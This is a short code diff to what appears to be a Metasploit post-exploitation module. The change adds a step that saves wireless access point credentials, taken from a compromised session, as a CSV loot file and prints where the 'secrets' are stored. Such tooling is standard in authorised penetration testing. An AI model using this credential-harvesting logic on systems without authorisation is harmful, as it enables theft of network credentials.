@@ -66,6 +66,15 @@ class MetasploitModule < Msf::Post
     end
 
     print_line(ap_tbl.to_s)
+    p = store_loot(
+      'wireless.ap.creds',
+      'text/csv',
+      session,
+      ap_tbl.to_csv,
+      File.basename('wireless_ap_credentials.txt')
+    )
+    print_good("Secrets stored in: #{p}")
+
   end
 
   def search_token(block, token)
